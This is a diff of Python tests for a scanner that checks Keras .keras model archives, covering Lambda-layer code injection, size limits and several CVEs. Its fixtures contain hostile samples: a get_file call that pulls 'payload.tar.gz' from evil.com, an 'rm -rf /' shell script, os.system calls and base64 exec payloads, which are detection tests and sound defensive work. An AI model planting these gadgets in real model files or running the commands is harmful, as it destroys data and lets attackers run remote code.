@@ -10,8 +10,6 @@ The new .keras format is a ZIP archive containing:
 import base64
 import json
 import marshal
-import os
-import tempfile
 import warnings
 import zipfile
 from pathlib import Path
@@ -24,7 +22,7 @@ from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.scanners import keras_zip_scanner as keras_zip_scanner_module
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
-from modelaudit.scanners.keras_zip_scanner import KerasZipScanner
+from modelaudit.scanners.keras_zip_scanner import KerasZipScanner, _has_get_file_reference
 
 try:
     import h5py
@@ -48,6 +46,16 @@ def create_configured_keras_zip(
         if weights_h5_path is not None:
             zf.write(weights_h5_path, "model.weights.h5")
     return keras_path
+
+
+def _build_test_keras_zip(config: dict[str, Any] | str, tmp_path: Path, keras_version: str) -> str:
+    """Create a minimal .keras ZIP archive for CVE regression tests."""
+    keras_path = tmp_path / "model.keras"
+    config_json = config if isinstance(config, str) else json.dumps(config)
+    with zipfile.ZipFile(keras_path, "w") as zf:
+        zf.writestr("config.json", config_json)
+        zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
+    return str(keras_path)
 
 
 def _assert_inconclusive_keras_zip_scan(model_path: Path, reason: str, expected_check_name: str) -> None:
@@ -408,7 +416,77 @@ class TestKerasZipScanner:
         assert limit_checks[0].status == CheckStatus.FAILED
         assert limit_checks[0].details["uncompressed_size"] == 4096
         assert limit_checks[0].details["max_embedded_weights_bytes"] == 1024
+        assert result.success is False
+        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+        assert "keras_zip_embedded_weights_too_large" in result.metadata["scan_outcome_reasons"]
         assert not any(issue.details.get("cve_id") == "CVE-2026-1669" for issue in result.issues)
+
+    def test_embedded_weights_size_limit_runs_without_h5py(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """The size-limit fail-closed reason does not require optional HDF5 parsing."""
+        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
+
+        scanner = KerasZipScanner({"max_embedded_weights_bytes": 1024})
+        keras_path = tmp_path / "oversized_weights_without_h5py.keras"
+        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
+            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
+            zf.writestr("model.weights.h5", b"0" * 4096)
+
+        result = scanner.scan(str(keras_path))
+
+        limit_checks = [check for check in result.checks if check.name == "Embedded Weights Size Limit"]
+        assert len(limit_checks) == 1
+        assert result.success is False
+        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+        assert "keras_zip_embedded_weights_too_large" in result.metadata["scan_outcome_reasons"]
+
+    def test_embedded_weights_size_limit_returns_exit2_and_skips_cache(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """Oversized embedded weights must fail closed at the aggregate/cache boundary."""
+        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", True)
+
+        keras_path = tmp_path / "cached_oversized_weights.keras"
+        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
+            zf.writestr("metadata.json", json.dumps({"keras_version": "3.12.0"}))
+            zf.writestr("model.weights.h5", b"0" * 4096)
+        cache_dir = tmp_path / "cache"
+
+        reset_cache_manager()
+        first_result = scan_model_directory_or_file(
+            str(keras_path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+            max_embedded_weights_bytes=1024,
+        )
+        second_result = scan_model_directory_or_file(
+            str(keras_path),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+            max_embedded_weights_bytes=1024,
+        )
+        metadata = second_result.file_metadata[str(keras_path)]
+
+        assert determine_exit_code(first_result) == 2
+        assert determine_exit_code(second_result) == 2
+        assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+        assert "keras_zip_embedded_weights_too_large" in metadata.get("scan_outcome_reasons")
+        assert any(
+            issue.message.startswith("Skipping embedded model.weights.h5 inspection") for issue in second_result.issues
+        )
+        assert not any(
+            issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in second_result.issues
+        )
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
 
     @pytest.mark.parametrize(
         "scanner_config",
@@ -720,7 +798,7 @@ class TestKerasZipScanner:
         assert "keras_version" not in result.metadata
         assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)
 
-    def test_lambda_layer_with_exec(self):
+    def test_lambda_layer_with_exec(self, tmp_path: Path) -> None:
         """Test detection of Lambda layer with exec() call."""
         scanner = KerasZipScanner()
 
@@ -749,36 +827,27 @@ class TestKerasZipScanner:
             },
         }
 
-        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
-            with zipfile.ZipFile(f, "w") as zf:
-                zf.writestr("config.json", json.dumps(config))
-                zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
-            temp_path = f.name
+        temp_path = Path(_build_test_keras_zip(config, tmp_path, "3.0.0"))
+        result = scanner.scan(str(temp_path))
 
-        try:
-            result = scanner.scan(temp_path)
+        # Should detect Lambda layer with exec
+        assert len(result.issues) > 0, "Should detect Lambda layer with dangerous code"
 
-            # Should detect Lambda layer with exec
-            assert len(result.issues) > 0, "Should detect Lambda layer with dangerous code"
+        # Check for critical issue
+        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
+        assert len(critical_issues) > 0, "Lambda with exec should be CRITICAL"
 
-            # Check for critical issue
-            critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
-            assert len(critical_issues) > 0, "Lambda with exec should be CRITICAL"
+        # Check that exec was detected
+        exec_found = False
+        for issue in result.issues:
+            if "exec" in issue.message.lower() and "lambda" in issue.message.lower():
+                exec_found = True
+                assert "lambda_1" in issue.message or "lambda_1" in str(issue.details)
+                break
 
-            # Check that exec was detected
-            exec_found = False
-            for issue in result.issues:
-                if "exec" in issue.message.lower() and "lambda" in issue.message.lower():
-                    exec_found = True
-                    assert "lambda_1" in issue.message or "lambda_1" in str(issue.details)
-                    break
+        assert exec_found, "Should detect exec in Lambda layer"
 
-            assert exec_found, "Should detect exec in Lambda layer"
-
-        finally:
-            os.unlink(temp_path)
-
-    def test_multiple_dangerous_patterns(self):
+    def test_multiple_dangerous_patterns(self, tmp_path: Path) -> None:
         """Test detection of multiple dangerous patterns in Lambda layers."""
         scanner = KerasZipScanner()
 
@@ -807,30 +876,25 @@ __import__('pickle').loads(data)
             },
         }
 
-        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
-            with zipfile.ZipFile(f, "w") as zf:
-                zf.writestr("config.json", json.dumps(config))
-            temp_path = f.name
+        temp_path = tmp_path / "multiple_patterns.keras"
+        with zipfile.ZipFile(temp_path, "w") as zf:
+            zf.writestr("config.json", json.dumps(config))
 
-        try:
-            result = scanner.scan(temp_path)
+        result = scanner.scan(str(temp_path))
 
-            # Should detect dangerous patterns
-            assert len(result.issues) > 0, "Should detect dangerous patterns"
+        # Should detect dangerous patterns
+        assert len(result.issues) > 0, "Should detect dangerous patterns"
 
-            # Check that multiple patterns were detected
-            all_messages = " ".join(issue.message for issue in result.issues)
-            patterns_detected = []
-            for pattern in ["eval", "subprocess", "__import__", "pickle"]:
-                if pattern in all_messages.lower():
-                    patterns_detected.append(pattern)
+        # Check that multiple patterns were detected
+        all_messages = " ".join(issue.message for issue in result.issues)
+        patterns_detected = []
+        for pattern in ["eval", "subprocess", "__import__", "pickle"]:
+            if pattern in all_messages.lower():
+                patterns_detected.append(pattern)
 
-            assert len(patterns_detected) > 0, f"Should detect dangerous patterns, found: {patterns_detected}"
+        assert len(patterns_detected) > 0, f"Should detect dangerous patterns, found: {patterns_detected}"
 
-        finally:
-            os.unlink(temp_path)
-
-    def test_safe_lambda_layer(self):
+    def test_safe_lambda_layer(self, tmp_path: Path) -> None:
         """Test that safe Lambda layers are handled appropriately."""
         scanner = KerasZipScanner()
 
@@ -853,20 +917,15 @@ __import__('pickle').loads(data)
             },
         }
 
-        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
-            with zipfile.ZipFile(f, "w") as zf:
-                zf.writestr("config.json", json.dumps(config))
-            temp_path = f.name
+        temp_path = tmp_path / "safe_lambda.keras"
+        with zipfile.ZipFile(temp_path, "w") as zf:
+            zf.writestr("config.json", json.dumps(config))
 
-        try:
-            result = scanner.scan(temp_path)
+        result = scanner.scan(str(temp_path))
 
-            # Safe Lambda should not be CRITICAL
-            critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
-            assert len(critical_issues) == 0, "Safe Lambda should not be CRITICAL"
-
-        finally:
-            os.unlink(temp_path)
+        # Safe Lambda should not be CRITICAL
+        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
+        assert len(critical_issues) == 0, "Safe Lambda should not be CRITICAL"
 
     def test_opaque_lambda_bytecode_stays_warning(self, tmp_path: Path) -> None:
         """Opaque compiled Lambda bytecode should remain a warning-level finding."""
@@ -1055,7 +1114,7 @@ __import__('pickle').loads(data)
             assert cve_checks[0].status == CheckStatus.FAILED
             assert cve_checks[0].severity == IssueSeverity.WARNING
 
-    def test_custom_registered_objects(self):
+    def test_custom_registered_objects(self, tmp_path: Path) -> None:
         """Test detection of custom registered objects."""
         scanner = KerasZipScanner()
 
@@ -1073,54 +1132,43 @@ __import__('pickle').loads(data)
             },
         }
 
-        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
-            with zipfile.ZipFile(f, "w") as zf:
-                zf.writestr("config.json", json.dumps(config))
-            temp_path = f.name
+        temp_path = tmp_path / "custom_registered.keras"
+        with zipfile.ZipFile(temp_path, "w") as zf:
+            zf.writestr("config.json", json.dumps(config))
 
-        try:
-            result = scanner.scan(temp_path)
+        result = scanner.scan(str(temp_path))
 
-            # Should detect custom registered object
-            custom_found = False
-            for check in result.checks:
-                if "custom" in check.message.lower() and "registered" in check.message.lower():
-                    custom_found = True
-                    break
+        # Should detect custom registered object
+        custom_found = False
+        for check in result.checks:
+            if "custom" in check.message.lower() and "registered" in check.message.lower():
+                custom_found = True
+                break
 
-            assert custom_found, "Should detect custom registered objects"
+        assert custom_found, "Should detect custom registered objects"
 
-        finally:
-            os.unlink(temp_path)
-
-    def test_executable_files_in_zip(self):
+    def test_executable_files_in_zip(self, tmp_path: Path) -> None:
         """Test detection of executable files in the ZIP archive."""
         scanner = KerasZipScanner()
 
         config = {"class_name": "Sequential", "config": {"layers": []}}
 
-        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
-            with zipfile.ZipFile(f, "w") as zf:
-                zf.writestr("config.json", json.dumps(config))
-                # Add suspicious files
-                zf.writestr("malicious.py", "import os; os.system('cmd')")
-                zf.writestr("script.sh", "#!/bin/bash\nrm -rf /")
+        temp_path = tmp_path / "executable_files.keras"
+        with zipfile.ZipFile(temp_path, "w") as zf:
+            zf.writestr("config.json", json.dumps(config))
+            # Add suspicious files
+            zf.writestr("malicious.py", "import os; os.system('cmd')")
+            zf.writestr("script.sh", "#!/bin/bash\nrm -rf /")
 
-            temp_path = f.name
+        result = scanner.scan(str(temp_path))
 
-        try:
-            result = scanner.scan(temp_path)
+        # Should detect Python and shell scripts
+        suspicious_files = []
+        for check in result.checks:
+            if "Python file" in check.message or "Executable file" in check.message:
+                suspicious_files.append(check.message)
 
-            # Should detect Python and shell scripts
-            suspicious_files = []
-            for check in result.checks:
-                if "Python file" in check.message or "Executable file" in check.message:
-                    suspicious_files.append(check.message)
-
-            assert len(suspicious_files) >= 2, f"Should detect suspicious files, found: {suspicious_files}"
-
-        finally:
-            os.unlink(temp_path)
+        assert len(suspicious_files) >= 2, f"Should detect suspicious files, found: {suspicious_files}"
 
     def test_case_insensitive_suspicious_extension_detection(self, tmp_path: Path) -> None:
         """Uppercase/mixed-case executable extensions should be detected."""
@@ -1186,7 +1234,7 @@ __import__('pickle').loads(data)
             check.name == "Executable File Detection" and check.status == CheckStatus.FAILED for check in result.checks
         )
 
-    def test_nested_models(self):
+    def test_nested_models(self, tmp_path: Path) -> None:
         """Test scanning of nested model structures."""
         scanner = KerasZipScanner()
 
@@ -1217,78 +1265,63 @@ __import__('pickle').loads(data)
             },
         }
 
-        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
-            with zipfile.ZipFile(f, "w") as zf:
-                zf.writestr("config.json", json.dumps(config))
-            temp_path = f.name
+        temp_path = tmp_path / "nested_models.keras"
+        with zipfile.ZipFile(temp_path, "w") as zf:
+            zf.writestr("config.json", json.dumps(config))
 
-        try:
-            result = scanner.scan(temp_path)
+        result = scanner.scan(str(temp_path))
 
-            # Should detect Lambda in nested model
-            assert len(result.issues) > 0, "Should detect Lambda in nested model"
+        # Should detect Lambda in nested model
+        assert len(result.issues) > 0, "Should detect Lambda in nested model"
 
-            # Check that __import__ was detected
-            import_found = False
-            for issue in result.issues:
-                if "__import__" in issue.message.lower():
-                    import_found = True
-                    break
+        # Check that __import__ was detected
+        import_found = False
+        for issue in result.issues:
+            if "__import__" in issue.message.lower():
+                import_found = True
+                break
 
-            assert import_found, "Should detect __import__ in nested Lambda"
+        assert import_found, "Should detect __import__ in nested Lambda"
 
-        finally:
-            os.unlink(temp_path)
-
-    def test_invalid_json_config(self):
+    def test_invalid_json_config(self, tmp_path: Path) -> None:
         """Test handling of invalid JSON in config."""
         scanner = KerasZipScanner()
 
-        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
-            with zipfile.ZipFile(f, "w") as zf:
-                zf.writestr("config.json", "{ invalid json }")
-            temp_path = f.name
+        temp_path = tmp_path / "invalid_json.keras"
+        with zipfile.ZipFile(temp_path, "w") as zf:
+            zf.writestr("config.json", "{ invalid json }")
 
-        try:
-            result = scanner.scan(temp_path)
+        result = scanner.scan(str(temp_path))
 
-            # Should handle invalid JSON gracefully
-            assert not result.success
-            json_error_found = False
-            for check in result.checks:
-                if "parse" in check.message.lower() and "json" in check.message.lower():
-                    json_error_found = True
-                    break
+        # Should handle invalid JSON gracefully
+        assert not result.success
+        json_error_found = False
+        for check in result.checks:
+            if "parse" in check.message.lower() and "json" in check.message.lower():
+                json_error_found = True
+                break
 
-            assert json_error_found, "Should report JSON parsing error"
+        assert json_error_found, "Should report JSON parsing error"
 
-        finally:
-            os.unlink(temp_path)
-
-    def test_missing_config_json(self):
+    def test_missing_config_json(self, tmp_path: Path) -> None:
         """Test handling of .keras file without config.json."""
         scanner = KerasZipScanner()
 
-        with tempfile.NamedTemporaryFile(suffix=".keras", delete=False) as f:
-            with zipfile.ZipFile(f, "w") as zf:
-                # Only add metadata, no config
-                zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
-            temp_path = f.name
+        temp_path = tmp_path / "missing_config.keras"
+        with zipfile.ZipFile(temp_path, "w") as zf:
+            # Only add metadata, no config
+            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
 
-        try:
-            result = scanner.scan(temp_path)
+        result = scanner.scan(str(temp_path))
 
-            # Should handle missing config.json
-            missing_config_found = False
-            for check in result.checks:
-                if "config.json" in check.message:
-                    missing_config_found = True
-                    break
+        # Should handle missing config.json
+        missing_config_found = False
+        for check in result.checks:
+            if "config.json" in check.message:
+                missing_config_found = True
+                break
 
-            assert missing_config_found, "Should report missing config.json"
-
-        finally:
-            os.unlink(temp_path)
+        assert missing_config_found, "Should report missing config.json"
 
     def test_detects_subclassed_model_in_zip(self, tmp_path):
         """Test that scanner detects subclassed models with custom class names."""
@@ -1697,18 +1730,10 @@ class TestCVE202549655TorchModuleWrapper:
 
     def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path) -> str:
         """Helper to create a .keras ZIP with the given config.json."""
-        keras_path = tmp_path / "model.keras"
-        with zipfile.ZipFile(keras_path, "w") as zf:
-            zf.writestr("config.json", json.dumps(config))
-            zf.writestr("metadata.json", json.dumps({"keras_version": "3.11.0"}))
-        return str(keras_path)
+        return _build_test_keras_zip(config, tmp_path, "3.11.0")
 
     def _make_keras_zip_with_version(self, config: dict[str, Any], tmp_path: Path, keras_version: str) -> str:
-        keras_path = tmp_path / "model.keras"
-        with zipfile.ZipFile(keras_path, "w") as zf:
-            zf.writestr("config.json", json.dumps(config))
-            zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
-        return str(keras_path)
+        return _build_test_keras_zip(config, tmp_path, keras_version)
 
     def test_torch_module_wrapper_detected_critical(self, tmp_path: Path) -> None:
         """TorchModuleWrapper layer should be flagged as CRITICAL."""
@@ -1876,11 +1901,7 @@ class TestCVE20251550ModuleReferences:
 
     def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path) -> str:
         """Helper to create a .keras ZIP with the given config.json."""
-        keras_path = tmp_path / "model.keras"
-        with zipfile.ZipFile(keras_path, "w") as zf:
-            zf.writestr("config.json", json.dumps(config))
-            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
-        return str(keras_path)
+        return _build_test_keras_zip(config, tmp_path, "3.0.0")
 
     def test_dangerous_module_os_in_layer(self, tmp_path: Path) -> None:
         """A layer referencing 'os' module should be flagged as CRITICAL."""
@@ -2138,13 +2159,25 @@ class TestCVE20251550ModuleReferences:
 class TestCVE20258747GetFileGadget:
     """Test CVE-2025-8747: keras.utils.get_file gadget bypass detection."""
 
+    def test_get_file_reference_reuses_lowered_value_text(self) -> None:
+        """Non-exact callable checks should lowercase each string once."""
+
+        class CountingValue(str):
+            lower_calls = 0
+
+            def strip(self, chars: str | None = None, /) -> "CountingValue":
+                return self
+
+            def lower(self) -> str:
+                type(self).lower_calls += 1
+                return super().lower()
+
+        assert _has_get_file_reference([CountingValue("pkg.keras.utils.get_file")])
+        assert CountingValue.lower_calls == 1
+
     def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
         """Helper to create a .keras ZIP with raw config string."""
-        keras_path = tmp_path / "model.keras"
-        with zipfile.ZipFile(keras_path, "w") as zf:
-            zf.writestr("config.json", config_str)
-            zf.writestr("metadata.json", json.dumps({"keras_version": "3.5.0"}))
-        return str(keras_path)
+        return _build_test_keras_zip(config_str, tmp_path, "3.5.0")
 
     def test_get_file_with_url_detected(self, tmp_path: Path) -> None:
         """Config referencing get_file with URL should be CRITICAL."""
@@ -2170,6 +2203,58 @@ class TestCVE20258747GetFileGadget:
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
         assert len(cve_issues) >= 1, "Should detect get_file + URL as CVE-2025-8747"
         assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_description_scoped_get_file_with_url_is_not_treated_as_documentation(self, tmp_path: Path) -> None:
+        """Doc-like paths should still scan callable get_file plus URL fields."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "description": {
+                    "fn": "keras.utils.get_file",
+                    "url": "https://evil.com/payload.tar.gz",
+                }
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) >= 1
+
+    def test_description_class_name_get_file_docs_not_flagged(self, tmp_path: Path) -> None:
+        """Doc tables that name get_file class fields should stay documentation-only."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "description": {
+                    "class_name": "keras.utils.get_file",
+                    "url": "https://docs.example/keras-get-file-guide",
+                    "notes": "Documentation table describing the get_file function signature.",
+                }
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert cve_issues == []
+
+    def test_description_url_with_get_file_prose_not_flagged(self, tmp_path: Path) -> None:
+        """Doc URLs plus prose mentions should not be treated as executable get_file calls."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "description": {
+                    "summary": "Documentation example: keras.utils.get_file can download files in user code.",
+                    "url": "https://docs.example/keras-get-file-guide",
+                }
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert cve_issues == []
 
     def test_get_file_with_url_in_args_list_detected(self, tmp_path: Path) -> None:
         """Config with URL inside args list should also be detected."""
@@ -2568,11 +2653,7 @@ class TestCVE20259906UnsafeDeserialization:
 
     def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
         """Helper to create a .keras ZIP with raw config string."""
-        keras_path = tmp_path / "model.keras"
-        with zipfile.ZipFile(keras_path, "w") as zf:
-            zf.writestr("config.json", config_str)
-            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
-        return str(keras_path)
+        return _build_test_keras_zip(config_str, tmp_path, "3.0.0")
 
     def test_enable_unsafe_deserialization_detected(self, tmp_path: Path) -> None:
         """Config referencing enable_unsafe_deserialization should be CRITICAL."""
@@ -2849,12 +2930,8 @@ class TestCVE20259906UnsafeDeserialization:
 class TestCVE20243660LambdaAttribution:
     """Test CVE-2024-3660: Lambda layer code injection attribution."""
 
-    def _make_keras_zip(self, config: dict, tmp_path: Path, keras_version: str = "2.10.0") -> str:
-        keras_path = tmp_path / "model.keras"
-        with zipfile.ZipFile(keras_path, "w") as zf:
-            zf.writestr("config.json", json.dumps(config))
-            zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
-        return str(keras_path)
+    def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path, keras_version: str = "2.10.0") -> str:
+        return _build_test_keras_zip(config, tmp_path, keras_version)
 
     def test_lambda_layer_has_cve_2024_3660_attribution(self, tmp_path: Path) -> None:
         """Lambda layer in .keras file should include CVE-2024-3660 attribution."""
@@ -2883,6 +2960,68 @@ class TestCVE20243660LambdaAttribution:
         assert cve_issues[0].details["description"]
         assert cve_issues[0].details["remediation"]
         assert cve_issues[0].details["layer_name"] == "my_lambda"
+
+    @pytest.mark.parametrize(
+        "layer_class",
+        [
+            "keras.layers.Lambda",
+            "tf_keras.src.layers.core.lambda_layer.Lambda",
+        ],
+    )
+    def test_fully_qualified_lambda_layer_has_cve_2024_3660_attribution(self, tmp_path: Path, layer_class: str) -> None:
+        """Keras-qualified Lambda class names should use Lambda-specific ZIP checks."""
+        scanner = KerasZipScanner()
+        encoded = base64.b64encode(b"exec('print(1)')").decode()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": layer_class,
+                        "name": "qualified_lambda",
+                        "config": {"function": [encoded, None, None]},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
+        dangerous_lambda = [check for check in result.checks if check.name == "Dangerous Lambda Layer"]
+        assert len(cve_issues) == 1
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+        assert len(dangerous_lambda) == 1
+        assert dangerous_lambda[0].details["layer_name"] == "qualified_lambda"
+
+    def test_custom_namespace_lambda_layer_not_attributed_to_keras_zip_cve(self, tmp_path: Path) -> None:
+        """Custom classes ending in Lambda should not be treated as Keras Lambda."""
+        scanner = KerasZipScanner()
+        encoded = base64.b64encode(b"exec('print(1)')").decode()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "myproject.layers.Lambda",
+                        "name": "custom_lambda",
+                        "config": {"function": [encoded, None, None]},
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(config, tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
+        dangerous_lambda = [check for check in result.checks if check.name == "Dangerous Lambda Layer"]
+        custom_layer_checks = [
+            check
+            for check in result.checks
+            if check.name == "Custom Layer Class Detection"
+            and check.details.get("layer_class") == "myproject.layers.Lambda"
+        ]
+        assert cve_issues == []
+        assert dangerous_lambda == []
+        assert len(custom_layer_checks) == 1
 
     def test_no_cve_without_lambda(self, tmp_path: Path) -> None:
         """Non-Lambda model should NOT have CVE-2024-3660 attribution."""
